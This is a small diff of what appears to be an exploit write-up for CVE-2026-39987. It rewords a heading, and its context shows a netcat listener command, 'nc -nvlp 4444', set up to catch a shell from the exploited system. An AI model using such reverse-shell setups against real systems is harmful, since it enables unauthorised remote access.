@@ -330,7 +330,7 @@ if __name__ == "__main__":
 
 ```
 
-# CVE-2026-39987 exploit
+# Exploit CVE-2026-39987 
 To exploit this, I set up a netcat listener:
 ```bash
 nc -nvlp 4444
